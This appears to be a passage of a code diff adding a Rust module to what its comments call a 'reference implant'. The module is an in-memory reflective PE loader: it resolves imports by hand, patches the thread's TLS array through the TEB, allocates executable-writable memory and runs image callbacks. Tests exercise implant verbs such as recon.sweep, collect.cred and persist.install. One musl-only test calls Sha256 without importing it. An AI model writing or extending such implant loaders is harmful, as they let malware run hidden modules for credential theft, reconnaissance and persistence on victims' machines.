+                    break;
+                }
+                let address = if value & (1 << 63) != 0 {
+                    let ordinal = (value & 0xffff) as usize;
+                    unsafe { GetProcAddress(library, ordinal as *const u8) }
+                } else {
+                    let name = base.add(value as usize + 2);
+                    unsafe { GetProcAddress(library, name) }
+                };
+                let Some(address) = address else {
+                    return Err(format!(
+                        "module.load: an import from {dll:?} did not resolve"
+                    ));
+                };
+                unsafe { poke_u64(base.add(first_thunk + slot * 8), address as usize as u64) };
+                slot += 1;
+            }
+            offset += 20;
+        }
+    }
+
+    /// Gives the image its TLS block on the loading thread: copy the
+    /// template into a fresh block, take a slot in the thread's native-TLS
+    /// array (growing the array when the loader left no room), write the
+    /// slot's index into the image's index variable, and run the
+    /// callbacks. The loading-thread scope is the documented constraint
+    /// above.
+    unsafe fn give_tls(base: *mut u8, image: &PeImage) -> Result<(), String> {
+        if image.tls_rva == 0 || image.tls_size < 40 {
+            return Ok(());
+        }
+        let directory = base.add(image.tls_rva as usize);
+        let rva = |va: u64| va as usize - image.image_base as usize;
+        let start = unsafe { peek_u64(directory) } as usize;
+        let end = unsafe { peek_u64(directory.add(8)) } as usize;
+        let index_address = unsafe { peek_u64(directory.add(16)) } as usize;
+        let callbacks = unsafe { peek_u64(directory.add(24)) } as usize;
+        let zero_fill = unsafe { peek_u32(directory.add(32)) } as usize;
+        let template_len = end.saturating_sub(start);
+        let block_len = template_len + zero_fill;
+        if block_len == 0 {
+            return Ok(());
+        }
+        let block = unsafe {
+            VirtualAlloc(
+                std::ptr::null(),
+                block_len,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        } as *mut u8;
+        if block.is_null() {
+            return Err("module.load: the TLS block allocation failed".into());
+        }
+        if template_len > 0 {
+            unsafe {
+                std::ptr::copy_nonoverlapping(base.add(rva(start as u64)), block, template_len);
+            }
+        }
+        let index = unsafe { tls_array_insert(block)? };
+        unsafe { poke_u32(base.add(rva(index_address as u64)), index) };
+        if callbacks != 0 {
+            let mut at = base.add(rva(callbacks as u64));
+            loop {
+                let callback = unsafe { peek_u64(at) };
+                if callback == 0 {
+                    break;
+                }
+                let run: unsafe extern "C" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void) =
+                    unsafe { std::mem::transmute(base.add(rva(callback))) };
+                unsafe { run(base as *mut _, DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
+                at = at.add(8);
+            }
+        }
+        Ok(())
+    }
+
+    /// Puts the TLS block into the current thread's native-TLS array and
+    /// answers the slot's index, growing the array when the process
+    /// loader's allocation left no room. The reference implant loads and
+    /// dispatches on the one run-loop thread, so the one array this
+    /// touches is the only one that matters.
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn tls_array_insert(block: *mut u8) -> Result<u32, String> {
+        // The array's element count is not stored anywhere readable; the
+        // platform loader allocates one pointer per image with TLS plus a
+        // surplus, and 64 slots is the classic bound it never undercuts.
+        // A busy first array grows into a fresh one the TEB then names.
+        const CAPACITY: usize = 64;
+        let array: *mut *mut u8;
+        unsafe { std::arch::asm!("mov {array}, gs:[0x58]", array = out(reg) array) };
+        unsafe {
+            for index in 0..CAPACITY {
+                if (*array.add(index)).is_null() {
+                    *array.add(index) = block;
+                    return Ok(index as u32);
+                }
+            }
+        }
+        let grown = unsafe {
+            VirtualAlloc(
+                std::ptr::null(),
+                (CAPACITY + 1) * std::mem::size_of::<*mut u8>(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        } as *mut *mut u8;
+        if grown.is_null() {
+            return Err("module.load: the TLS array growth failed".into());
+        }
+        unsafe {
+            std::ptr::copy_nonoverlapping(array, grown, CAPACITY);
+            *grown.add(CAPACITY) = block;
+            std::arch::asm!(
+                "mov gs:[0x58], {grown}",
+                grown = in(reg) grown,
+                options(nostack)
+            );
+        }
+        Ok(CAPACITY as u32)
+    }
+
+    #[cfg(target_arch = "x86")]
+    unsafe fn tls_array_insert(block: *mut u8) -> Result<u32, String> {
+        const CAPACITY: usize = 64;
+        let array: *mut *mut u8;
+        unsafe { std::arch::asm!("mov {array}, fs:[0x2C]", array = out(reg) array) };
+        unsafe {
+            for index in 0..CAPACITY {
+                if (*array.add(index)).is_null() {
+                    *array.add(index) = block;
+                    return Ok(index as u32);
+                }
+            }
+        }
+        let grown = unsafe {
+            VirtualAlloc(
+                std::ptr::null(),
+                (CAPACITY + 1) * std::mem::size_of::<*mut u8>(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        } as *mut *mut u8;
+        if grown.is_null() {
+            return Err("module.load: the TLS array growth failed".into());
+        }
+        unsafe {
+            std::ptr::copy_nonoverlapping(array, grown, CAPACITY);
+            *grown.add(CAPACITY) = block;
+            std::arch::asm!("mov fs:[0x2C], {grown}", grown = in(reg) grown);
+        }
+        Ok(CAPACITY as u32)
+    }
+
+    #[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
+    unsafe fn tls_array_insert(_block: *mut u8) -> Result<u32, String> {
+        Err("module.load: this Windows architecture carries no TLS map".into())
+    }
+
+    unsafe fn c_string_at(at: *mut u8) -> Vec<u8> {
+        let mut bytes = Vec::new();
+        let mut walk = at;
+        unsafe {
+            while *walk != 0 {
+                bytes.push(*walk);
+                walk = walk.add(1);
+            }
+        }
+        bytes
+    }
+
+    unsafe fn export_table(
+        base: *mut u8,
+        image: &PeImage,
+    ) -> Result<HashMap<String, usize>, String> {
+        if image.export_rva == 0 || image.export_size == 0 {
+            return Err("module.load: the image exports nothing".into());
+        }
+        let directory = base.add(image.export_rva as usize);
+        let names_count = unsafe { peek_u32(directory.add(24)) } as usize;
+        let functions_rva = unsafe { peek_u32(directory.add(28)) } as usize;
+        let names_rva = unsafe { peek_u32(directory.add(32)) } as usize;
+        let ordinals_rva = unsafe { peek_u32(directory.add(36)) } as usize;
+        let mut exports = HashMap::new();
+        for index in 0..names_count {
+            let name_rva = unsafe { peek_u32(base.add(names_rva + index * 4)) } as usize;
+            let name = unsafe { c_string_at(base.add(name_rva)) };
+            let Ok(name) = String::from_utf8(name) else {
+                continue;
+            };
+            if !name.starts_with("rod_plugin_") {
+                continue;
+            }
+            let ordinal = unsafe { peek_u16(base.add(ordinals_rva + index * 2)) } as usize;
+            let function = unsafe { peek_u32(base.add(functions_rva + ordinal * 4)) } as usize;
+            exports.insert(name, function);
+        }
+        if exports.is_empty() {
+            return Err("module.load: the image exports no rod_plugin entry".into());
+        }
+        Ok(exports)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// An in-process stand-in library: fixed name and verbs, behavior by
+    /// table. Everything the registry does around a library is testable
+    /// without a platform loader.
+    struct FakeLibrary {
+        name: &'static str,
+        verbs: Vec<&'static str>,
+        fail: bool,
+        panicked: std::sync::atomic::AtomicBool,
+    }
+
+    impl FakeLibrary {
+        fn of(name: &'static str, verbs: &[&'static str]) -> FakeLibrary {
+            FakeLibrary {
+                name,
+                verbs: verbs.to_vec(),
+                fail: false,
+                panicked: std::sync::atomic::AtomicBool::new(false),
+            }
+        }
+    }
+
+    impl Library for FakeLibrary {
+        fn abi(&self) -> u32 {
+            ABI_VERSION
+        }
+        fn name(&self) -> String {
+            self.name.into()
+        }
+        fn verb_count(&self) -> u32 {
+            self.verbs.len() as u32
+        }
+        fn verb_name(&self, index: u32) -> Option<String> {
+            self.verbs.get(index as usize).map(|verb| verb.to_string())
+        }
+        fn run(&self, index: u32, arguments: &str) -> RunStatus {
+            if self.panicked.load(std::sync::atomic::Ordering::SeqCst) {
+                return RunStatus::Error("shim status -2: module handler panicked".into());
+            }
+            let verb = self.verbs[index as usize];
+            if self.fail {
+                RunStatus::Failed(format!("{verb} refused: {arguments}"))
+            } else {
+                RunStatus::Succeeded(format!("{verb} ran: {arguments}"))
+            }
+        }
+        fn free_string(&self, _string: AbiStr) {}
+    }
+
+    fn installed(name: &'static str, verbs: &[&'static str]) -> Plugins {
+        let plugins = Plugins::new();
+        let entry = ModuleEntry::new(
+            name.into(),
+            verbs.iter().map(|verb| verb.to_string()).collect(),
+            Box::new(FakeLibrary::of(name, verbs)),
+        );
+        plugins.install(entry);
+        plugins
+    }
+
+    #[test]
+    fn module_verbs_dispatch_like_compiled_ones() {
+        let plugins = installed("sweep", &["recon.sweep"]);
+        let (outcome, output) = plugins
+            .dispatch("recon.sweep", "10.0.0.0/24")
+            .expect("the route exists");
+        assert_eq!(outcome, Outcome::Succeeded);
+        assert_eq!(output, "recon.sweep ran: 10.0.0.0/24");
+        assert!(plugins.dispatch("no.such.verb", "").is_none());
+    }
+
+    #[test]
+    fn the_guards_refuse_what_a_module_cannot_own() {
+        for verb in [
+            "unnamespaced",
+            ".leading",
+            "trailing.",
+            "shell.exec",
+            "file.push",
+            "shell.interact",
+            "tunnel.socks",
+        ] {
+            assert!(validate_verb(verb).is_err(), "{verb} should refuse");
+        }
+        assert!(validate_verb("recon.sweep").is_ok());
+        assert!(validate_verb("collect.cred").is_ok());
+    }
+
+    #[test]
+    fn the_advertisement_source_reads_the_routes() {
+        let plugins = installed("sweep", &["recon.sweep", "persist.install"]);
+        let mut advertised = plugins.advertised_verbs();
+        advertised.sort();
+        assert_eq!(advertised, vec!["persist.install", "recon.sweep"]);
+    }
+
+    #[test]
+    fn unload_drops_the_routes_and_names_the_missing() {
+        let plugins = installed("sweep", &["recon.sweep"]);
+        let report = plugins.unload("sweep").expect("the unload runs");
+        assert!(report.contains("recon.sweep"), "{report}");
+        assert!(plugins.dispatch("recon.sweep", "").is_none());
+        assert!(plugins.list().contains("no modules"));
+        let missing = plugins.unload("ghost").expect_err("nothing to unload");
+        assert!(missing.contains("ghost"), "{missing}");
+    }
+
+    #[test]
+    fn a_later_registration_replaces_the_route() {
+        let plugins = Plugins::new();
+        plugins.install(ModuleEntry::new(
+            "first".into(),
+            vec!["recon.sweep".into()],
+            Box::new(FakeLibrary::of("first", &["recon.sweep"])),
+        ));
+        plugins.install(ModuleEntry::new(
+            "second".into(),
+            vec!["recon.sweep".into()],
+            Box::new(FakeLibrary::of("second", &["recon.sweep"])),
+        ));
+        let (_, output) = plugins.dispatch("recon.sweep", "x").expect("routed");
+        assert!(output.starts_with("recon.sweep ran"), "{output}");
+        // Both modules remain listed; the verb names its current owner
+        // only through dispatch -- the listing reports membership.
+        assert!(plugins.list().contains("first"));
+        assert!(plugins.list().contains("second"));
+    }
+
+    #[test]
+    fn handles_and_hashes_validate_before_anything_loads() {
+        for handle in ["", "has space", "bad/slash", &"x".repeat(65)] {
+            assert!(validate_handle(handle).is_err(), "{handle:?}");
+        }
+        assert!(validate_handle("sweep.2").is_ok());
+        assert!(verify_sha256(b"bytes", "deadbeef").is_err());
+        use sha2::{Digest, Sha256};
+        let good = Sha256::digest(b"bytes");
+        let good: String = good.iter().map(|b| format!("{b:02x}")).collect();
+        assert!(verify_sha256(b"bytes", &good).is_ok());
+        // Case-insensitive comparison: the token is hex either way.
+        assert!(verify_sha256(b"bytes", &good.to_uppercase()).is_ok());
+    }
+
+    #[cfg(all(unix, not(target_env = "musl")))]
+    #[test]
+    fn garbage_bytes_refuse_as_a_module() {
+        let plugins = Plugins::new();
+        use sha2::{Digest, Sha256};
+        let hash: String = Sha256::digest(b"not a module")
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect();
+        let cause = plugins
+            .load("junk", b"not a module", &hash)
+            .expect_err("not a loadable image");
+        assert!(cause.contains("not a loadable module"), "{cause}");
+    }
+
+    #[cfg(all(unix, target_env = "musl"))]
+    #[test]
+    fn the_musl_boundary_refuses_cleanly() {
+        let plugins = Plugins::new();
+        use sha2::Digest;
+        let hash: String = Sha256::digest(b"anything")
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect();
+        let cause = plugins
+            .load("x", b"anything", &hash)
+            .expect_err("no loader on this platform");
+        assert!(cause.contains("musl"), "{cause}");
+    }
+}
